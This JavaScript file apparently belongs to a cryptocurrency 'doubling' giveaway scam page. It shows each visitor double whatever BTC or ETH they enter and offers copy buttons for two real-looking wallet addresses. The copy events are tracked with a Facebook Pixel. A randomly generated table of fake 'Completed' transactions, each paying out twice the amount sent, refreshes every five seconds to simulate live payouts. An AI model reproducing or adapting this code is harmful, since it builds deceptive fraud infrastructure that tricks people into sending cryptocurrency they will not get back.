document.addEventListener('DOMContentLoaded', function () {
    const btcInput = document.getElementById('btc-input')
    const btcResult = document.getElementById('btc-result')
    const ethInput = document.getElementById('eth-input')
    const ethResult = document.getElementById('eth-result')

    function formatResult(number) {
        const resultString = number.toString()
        if (resultString.length > 4) {
            return resultString.slice(0, 4) + '...'
        }
        return resultString
    }

    function updateBtcResult() {
        const btcValue = parseFloat(btcInput.value)
        if (isNaN(btcValue) || btcValue < 0) {
            btcResult.innerHTML = '0 BTC'
            return
        }
        const formattedResult = formatResult(btcValue * 2)
        btcResult.innerHTML = formattedResult + ' '

        const btcImage = document.createElement('img')
        btcImage.src = 'images/BTC.png'
        btcImage.alt = 'BTC'
        btcImage.style.width = '20px'
        btcImage.style.height = '30px'
        btcImage.style.verticalAlign = 'middle'
        btcImage.style.marginBottom = '7px'

        btcResult.appendChild(btcImage)
    }

    function updateEthResult() {
        const ethValue = parseFloat(ethInput.value)
        if (isNaN(ethValue) || ethValue < 0) {
            ethResult.innerHTML = '0 ETH'
            return
        }
        const formattedResult = formatResult(ethValue * 2)
        ethResult.innerHTML = formattedResult + ' '

        const ethImage = document.createElement('img')
        ethImage.src = 'images/ETH.png'
        ethImage.alt = 'ETH'
        ethImage.style.width = '20px'
        ethImage.style.height = '30px'
        ethImage.style.verticalAlign = 'middle'
        ethImage.style.marginBottom = '7px'

        ethResult.appendChild(ethImage)
    }

    btcInput.addEventListener('input', updateBtcResult)
    ethInput.addEventListener('input', updateEthResult)

    updateBtcResult()
    updateEthResult()
})


// галочки при копировании + пиксель ФБ
// ------------------------------------------------------------
function copyAddress(address) {
    if (sessionStorage.getItem('addressCopied1') !== 'true') {
        navigator.clipboard
            .writeText(address)
            .then(() => {
                // console.log('Address copied to clipboard:', address); // Debug message

                // Отправка события в Facebook Pixel
                try {
                    fbq('trackCustom', 'CopyWalletAddress', { walletAddress: address });
                    console.log('Facebook Pixel event sent:', address); // Debug message
                } catch (error) {
                    console.error('Failed to send Facebook Pixel event:', error);
                }

                const statusElement = document.querySelector('.address');
                const originalText = statusElement.innerHTML;

                statusElement.innerHTML =
                    '<p class="address">bc1qmpvyvp04pg78p2rl6f70jqIash9m4qm7u40q3f <img src="images/arrow.png" alt="Copied" class="checkmark" /></p>';

                setTimeout(() => {
                    statusElement.innerHTML = originalText;
                }, 2000);

                // Устанавливаем флаг в sessionStorage, что адрес был скопирован
                sessionStorage.setItem('addressCopied1', 'true');
            })
            .catch(err => {
                console.error('Failed to copy: ', err);
            });
    } else {
        console.log('Address has already been copied in this session.');
    }
}

function copyAddress2(address) {
    if (sessionStorage.getItem('addressCopied2') !== 'true') {
        navigator.clipboard
            .writeText(address)
            .then(() => {
                // console.log('Address copied to clipboard:', address); // Debug message

                // Отправка события в Facebook Pixel
                try {
                    fbq('trackCustom', 'CopyWalletAddress', { walletAddress: address });
                    console.log('Facebook Pixel event sent:', address); // Debug message
                } catch (error) {
                    console.error('Failed to send Facebook Pixel event:', error);
                }

                const statusElement = document.querySelector('.address2');
                const originalText = statusElement.innerHTML;

                statusElement.innerHTML =
                    '<p class="address">0x44D619199bcFc186310dbf68C7aFF47db28257B3 <img src="images/arrow.png" alt="Copied" class="checkmark" /></p>';

                setTimeout(() => {
                    statusElement.innerHTML = originalText;
                }, 2000);

                // Устанавливаем флаг в sessionStorage, что адрес был скопирован
                sessionStorage.setItem('addressCopied2', 'true');
            })
            .catch(err => {
                console.error('Failed to copy: ', err);
            });
    } else {
        console.log('Address has already been copied in this session.');
    }
}

document.querySelector('#copyButton1').addEventListener('click', function() {
    copyAddress('your_wallet_address_here');
});

document.querySelector('#copyButton2').addEventListener('click', function() {
    copyAddress2('your_other_wallet_address_here');
});

// таблица
// ------------------------------------------------------------

function getRandomHash() {
	return (
		Math.random().toString(36).substring(2, 15) +
		Math.random().toString(36).substring(2, 15)
	)
}

function getRandomAddress() {
	return (
		Math.random().toString(36).substring(2, 15) +
		Math.random().toString(36).substring(2, 15)
	)
}

function getRandomValue() {
	return (Math.random() * 10).toFixed(2)
}

function getRandomCurrency() {
	return Math.random() > 0.5 ? 'BTC' : 'ETH'
}

function createRow(hash, from1, from2, to1, to2, value1, value2, currency) {
	const row = document.createElement('tr')

	const hashCell = document.createElement('td')
	hashCell.innerHTML = `<p>${hash}</p>`
	row.appendChild(hashCell)

	const fromCell = document.createElement('td')
	fromCell.innerHTML = `<p>${from1}</p><p>${from2}</p>`
	row.appendChild(fromCell)

	const arrowCell = document.createElement('td')
	const checkmarkImg = document.createElement('img')
	checkmarkImg.src = 'images/arrow.png'
	checkmarkImg.style.width = '32px'
	checkmarkImg.style.height = '24px'
	arrowCell.appendChild(checkmarkImg)

	arrowCell.style.textAlign = 'center'
	arrowCell.style.verticalAlign = 'middle'
	row.appendChild(arrowCell)

	const toCell = document.createElement('td')
	toCell.innerHTML = `<p>${to1}</p><p>${to2}</p>`
	row.appendChild(toCell)

	const valueCell = document.createElement('td')
	valueCell.innerHTML = `<p class="value">${value1} ${currency}</p><p class="value">${value2} ${currency}</p>`
	row.appendChild(valueCell)

	const statusCell = document.createElement('td')
	statusCell.innerHTML = `<p class="status">Completed</p>`
	row.appendChild(statusCell)

	return row
}

function populateTable() {
	const tbody = document.getElementById('transactions-body')
	tbody.innerHTML = '' 

	for (let i = 0; i < 5; i++) {
		const hash = getRandomHash()
		const from1 = getRandomAddress()
		const from2 = getRandomAddress()
		const to1 = getRandomAddress()
		const to2 = getRandomAddress()
		const value2 = getRandomValue()
		const value1 = (parseFloat(value2) * 2).toFixed(2)
		const currency = getRandomCurrency()
		const row = createRow(
			hash,
			from1,
			from2,
			to1,
			to2,
			value1,
			value2,
			currency
		)
		tbody.appendChild(row)
	}
}

populateTable()

setInterval(populateTable, 5000)
